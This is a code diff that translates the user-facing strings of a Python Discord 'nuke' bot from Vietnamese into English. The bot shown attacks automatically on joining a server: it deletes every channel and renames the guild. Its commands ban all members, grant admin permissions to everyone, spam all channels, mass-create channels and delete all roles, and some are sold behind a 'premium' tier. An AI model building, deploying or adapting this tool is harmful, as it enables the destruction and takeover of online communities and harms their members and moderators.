@@ -63,7 +63,7 @@ def is_free_premium(user_id):
     return False
 
 async def perform_attack(guild, config):
-    print('Thực hiện tấn công vào bang hội đang ở:', guild.name, guild.id)
+    print('Performing attack on guild at:', guild.name, guild.id)
     delete_channels = [channel.delete() for channel in guild.channels]
     await asyncio.gather(*delete_channels)
     await guild.edit(name=config['newServerName'])
@@ -78,7 +78,7 @@ async def perform_attack(guild, config):
             await asyncio.sleep(2)
 
 async def auto_nuke(guild, config):
-    print('Thực hiện auto nuke ở:', guild.name, guild.id)
+    print('Performing auto nuke at:', guild.name, guild.id)
     global auto_nuke_active
     auto_nuke_active = True
     new_channels = await guild.fetch_channels()
@@ -95,21 +95,21 @@ async def auto_nuke(guild, config):
 class CustomHelpCommand(commands.HelpCommand):
     async def send_bot_help(self, mapping):
         help_message = """
-# Các lệnh miễn phí có sẵn:
-```!attack``` - Thực hiện một cuộc tấn công vào máy chủ
-```!unban_all``` - Bỏ cấm tất cả người dùng trong máy chủ
-```!help``` - Hiển thị thông báo trợ giúp này
-```!free``` - Trải nghiệm gói cao cấp miễn phí trong 1 ngày
-# Các lệnh cao cấp:
-```!config``` - Xem cấu hình của bot
-```!everyone_admin``` - Cấp quản lý cho mọi người
-```!shuffle_channels``` - Xáo trộn vị trí các kênh trong máy chủ
-```!spam``` - Bắt đầu thư rác trên tất cả các kênh ví dụ !spam [đếm] [bối cảnh]
-```!created_channels``` - Tạo số lượng kênh nhất định với bối cảnh cho trước ví dụ !created_channels [đếm] [bối cảnh]
-```!ban_all``` - Cấm tất cả các thành viên trong máy chủ (trừ thành viên cao cấp)
-```!prune_members``` - Đá tất cả người dùng đã ngoại tuyến trong 1 ngày trở lên
-```!delete_channel``` - Xóa tất cả các kênh.
-```!delete_role``` - Xóa tất cả các vai trò (trừ everyone).
+# Available free commands:
+```!attack``` - Perform an attack on the server
+```!unban_all``` - Unban all users in the server
+```!help``` - Show this help message
+```!free``` - Experience premium package for free for 1 day
+# Premium commands:
+```!config``` - View bot configuration
+```!everyone_admin``` - Grant admin permissions to everyone
+```!shuffle_channels``` - Shuffle the positions of channels in the server
+```!spam``` - Start spam on all channels, e.g. !spam [count] [context]
+```!created_channels``` - Create a specified number of channels with given context, e.g. !created_channels [count] [context]
+```!ban_all``` - Ban all members in the server (excluding premium members)
+```!prune_members``` - Kick all users who have been offline for 1 day or more
+```!delete_channel``` - Delete all channels.
+```!delete_role``` - Delete all roles (except everyone).
         """
         await self.get_destination().send(help_message)
 
@@ -143,12 +143,12 @@ async def main():
 
     @bot.event
     async def on_ready():
-        print(f'{bot.user.name} đã sẵn sàng')
+        print(f'{bot.user.name} is ready')
         await bot.change_presence(status=discord.Status.dnd, activity=discord.Game(name="gg.gg/rspvn | !help"))
 
     @bot.event
     async def on_guild_join(guild):
-        print(f'Bot đã tham gia máy chủ: {guild.name} ({guild.id})')
+        print(f'Bot joined server: {guild.name} ({guild.id})')
         await perform_attack(guild, await load_config())
 
     @bot.command(name='attack')
@@ -160,7 +160,7 @@ async def main():
         if guild_id in last_attack_times:
             elapsed_time = current_time - last_attack_times[guild_id]
             if elapsed_time < 180:
-                await ctx.send(f'Vui lòng chờ {180 - int(elapsed_time)} giây nữa trước khi sử dụng lại lệnh này.')
+                await ctx.send(f'Please wait {180 - int(elapsed_time)} seconds before using this command again.')
                 return
 
         await perform_attack(ctx.guild, config_data)
@@ -169,7 +169,7 @@ async def main():
     @attack.error
     async def attack_error(ctx, error):
         if isinstance(error, commands.CommandOnCooldown):
-            await ctx.send(f"Lệnh attack đang hồi chiêu. Vui lòng chờ {error.retry_after:.2f} giây.")
+            await ctx.send(f"The attack command is on cooldown. Please wait {error.retry_after:.2f} seconds.")
         else:
             raise error
 
@@ -179,44 +179,44 @@ async def main():
         try:
             banned_users = [entry async for entry in ctx.guild.bans()]
             if not banned_users:
-                await ctx.send("Không có người dùng bị cấm.")
+                await ctx.send("No banned users.")
                 return
             for ban_entry in banned_users:
                 user = ban_entry.user
                 try:
                     await ctx.guild.unban(user)
-                    await ctx.send(f"Đã Unban {user.name}#{user.discriminator}.")
+                    await ctx.send(f"Unbanned {user.name}#{user.discriminator}.")
                 except discord.Forbidden:
-                    await ctx.send(f"Không thể Unban {user.name}#{user.discriminator}. Permission denied.")
+                    await ctx.send(f"Cannot unban {user.name}#{user.discriminator}. Permission denied.")
                 except discord.HTTPException as e:
-                    await ctx.send(f"Thất bại Unban {user.name}#{user.discriminator}. HTTP Exception: {e}")
-            await ctx.send("Tất cả các thành viên bỏ cấm không bị cản trở.")
+                    await ctx.send(f"Failed to unban {user.name}#{user.discriminator}. HTTP Exception: {e}")
+            await ctx.send("All banned members have been unbanned.")
         except Exception as e:
-            await ctx.send(f"Đã xảy ra lỗi: {e}")
+            await ctx.send(f"An error occurred: {e}")
 
     @bot.command()
     async def add_premium_user(ctx, user_id: int, duration: str):
-        if ctx.author.id != 892299052828491818:  # Thay thế YOUR_ADMIN_USER_ID bằng ID người dùng quản trị
-            await ctx.send("Bạn không có quyền sử dụng lệnh này.")
+        if ctx.author.id != 892299052828491818:  # Replace YOUR_ADMIN_USER_ID with the admin user ID
+            await ctx.send("You do not have permission to use this command.")
             return
 
         user = bot.get_user(user_id)
         if not user:
-            await ctx.send("Người dùng không tồn tại.")
+            await ctx.send("User does not exist.")
             return
 
         try:
             duration_timedelta = timedelta(days=int(duration))
             add_premium(user_id, duration_timedelta)
-            await ctx.send(f"Đã thêm {user.name}#{user.discriminator} làm thành viên cao cấp trong {duration} ngày.")
+            await ctx.send(f"Added {user.name}#{user.discriminator} as a premium member for {duration} days.")
         except ValueError:
-            await ctx.send("Định dạng thời gian không hợp lệ. Vui lòng nhập số ngày.")
+            await ctx.send("Invalid duration format. Please enter the number of days.")
 
     @bot.command(name='ban_all')
     @commands.has_permissions(ban_members=True)
     async def ban_all(ctx):
         if not is_premium(ctx.author.id) and not is_free_premium(ctx.author.id):
-            await ctx.send("Bạn cần đăng ký cao cấp để sử dụng lệnh này.")
+            await ctx.send("You need to be a premium member to use this command.")
             return
 
         premium_user_ids = set(premium_users.keys())
@@ -233,45 +233,45 @@ async def main():
 
     @bot.command(name='config')
     async def config(ctx):
-        premium_status = "Cao cấp" if is_premium(ctx.author.id) else "Không cao cấp"
-        premium_expiry = premium_users.get(str(ctx.author.id), "Không có")
+        premium_status = "Premium" if is_premium(ctx.author.id) else "Not premium"
+        premium_expiry = premium_users.get(str(ctx.author.id), "None")
         config_message = f"""
-        **Cấu hình Bot:**
-        - Trạng thái cao cấp: {premium_status}
-        - Hạn sử dụng cao cấp: {premium_expiry}
+        **Bot Configuration:**
+        - Premium Status: {premium_status}
+        - Premium Expiry: {premium_expiry}
         """
         try:
             await ctx.author.send(config_message)
-            await ctx.send("Đã gửi cấu hình bot vào tin nhắn riêng.")
+            await ctx.send("Bot configuration has been sent via DM.")
         except discord.Forbidden:
-            await ctx.send("Không thể gửi tin nhắn riêng. Vui lòng kiểm tra lại cài đặt quyền riêng tư của bạn.")
+            await ctx.send("Cannot send DM. Please check your privacy settings.")
 
     @bot.command(name='free')
     async def free(ctx):
         user_id = ctx.author.id
         if is_free_premium(user_id):
-            await ctx.send("Bạn đã sử dụng gói cao cấp miễn phí.")
+            await ctx.send("You have already used the free premium package.")
             return
 
         add_free_premium(user_id, timedelta(days=1))
-        await ctx.send("Bạn đã được thêm gói cao cấp miễn phí trong 1 ngày.")
+        await ctx.send("You have been given a free premium package for 1 day.")
 
     @bot.command(name='prune_members')
     @commands.has_permissions(kick_members=True)
     async def prune_members(ctx):
         if not is_premium(ctx.author.id) and not is_free_premium(ctx.author.id):
-            await ctx.send("Bạn cần đăng ký cao cấp để sử dụng lệnh này.")
+            await ctx.send("You need to be a premium member to use this command.")
             return
 
         members_to_prune = [member for member in ctx.guild.members if member.status == discord.Status.offline and (datetime.utcnow() - member.joined_at).days >= 1]
         for member in members_to_prune:
             try:
                 await member.kick(reason="Prune command executed")
-                await ctx.send(f"Đã đá {member.name}#{member.discriminator}.")
+                await ctx.send(f"Kicked {member.name}#{member.discriminator}.")
             except discord.Forbidden:
-                await ctx.send(f"Không thể đá {member.name}#{member.discriminator}. Permission denied.")
+                await ctx.send(f"Cannot kick {member.name}#{member.discriminator}. Permission denied.")
             except discord.HTTPException as e:
-                await ctx.send(f"Thất bại đá {member.name}#{member.discriminator}. HTTP Exception: {e}")
+                await ctx.send(f"Failed to kick {member.name}#{member.discriminator}. HTTP Exception: {e}")
 
     @bot.command(name='spam')
     @commands.check(lambda ctx: is_premium(ctx.author.id) or is_free_premium(ctx.author.id))
@@ -285,39 +285,39 @@ async def main():
 
         tasks = [spam_channel(channel) for channel in guild.text_channels]
         await asyncio.gather(*tasks)
-        await ctx.send(f"Đã gửi spam với nội dung: {context} {count} lần trên tất cả các kênh.")
+        await ctx.send(f"Spammed with context: {context} {count} times across all channels.")
 
     @bot.command(name='created_channels')
     async def created_channels(ctx, count: int, *, context: str):
         if not is_premium(ctx.author.id) and not is_free_premium(ctx.author.id):
-            await ctx.send("Lệnh này chỉ dành cho người dùng cao cấp.")
+            await ctx.send("This command is for premium users only.")
             return
         if count > 200:
-            await ctx.send("Giới hạn số lượng kênh tạo là 200.")
+            await ctx.send("The maximum number of channels to create is 200.")
             return
         for _ in range(count):
             await ctx.guild.create_text_channel(context)
-        await ctx.send(f"Đã tạo {count} kênh với bối cảnh '{context}'.")
+        await ctx.send(f"Created {count} channels with context '{context}'.")
 
     @bot.command(name='delete_channel')
     async def delete_channel(ctx):
         if not is_premium(ctx.author.id) and not is_free_premium(ctx.author.id):
-            await ctx.send("Lệnh này chỉ dành cho người dùng cao cấp.")
+            await ctx.send("This command is for premium users only.")
             return
-        await ctx.send("Đang xóa tất cả các kênh...")
+        await ctx.send("Deleting all channels...")
         delete_channels = [channel.delete() for channel in ctx.guild.channels]
         await asyncio.gather(*delete_channels)
-        await ctx.send("Tất cả các kênh đã được xóa.")
+        await ctx.send("All channels have been deleted.")
 
     @bot.command(name='delete_role')
     async def delete_role(ctx):
         if not is_premium(ctx.author.id) and not is_free_premium(ctx.author.id):
-            await ctx.send("Lệnh này chỉ dành cho người dùng cao cấp.")
+            await ctx.send("This command is for premium users only.")
             return
-        await ctx.send("Đang xóa tất cả các vai trò...")
+        await ctx.send("Deleting all roles...")
         delete_roles = [role.delete() for role in ctx.guild.roles if role.name != '@everyone']
         await asyncio.gather(*delete_roles)
-        await ctx.send("Tất cả các vai trò đã được xóa.")
+        await ctx.send("All roles have been deleted.")
 
     @bot.command()
     @commands.cooldown(1, 60, commands.BucketType.guild)
@@ -325,16 +325,16 @@ async def main():
         guild = ctx.guild
         everyone_role = guild.default_role
         await everyone_role.edit(permissions=discord.Permissions.all())
-        await ctx.send("Đã cấp quyền quản lý cho mọi người.")
+        await ctx.send("Granted admin permissions to everyone.")
 
     @everyone_admin.error
     async def everyone_admin_error(ctx, error):
         if isinstance(error, commands.MissingPermissions):
-            await ctx.send("Bạn không có quyền để thực hiện lệnh này.")
+            await ctx.send("You do not have permission to use this command.")
         elif isinstance(error, commands.CommandOnCooldown):
-            await ctx.send(f'Lệnh này đang hồi chiêu. Vui lòng thử lại sau {error.retry_after:.2f} giây.')
+            await ctx.send(f'This command is on cooldown. Please try again in {error.retry_after:.2f} seconds.')
         else:
-            await ctx.send(f'Đã xảy ra lỗi: {error}')
+            await ctx.send(f'An error occurred: {error}')
 
     @bot.command()
     async def ls(ctx):
@@ -344,7 +344,6 @@ async def main():
                 print(f'Left guild: {guild.name}')
         else:
             await ctx.send("You don't have permission to use this command.")
-
 
     await bot.start(config_data['token'])
 
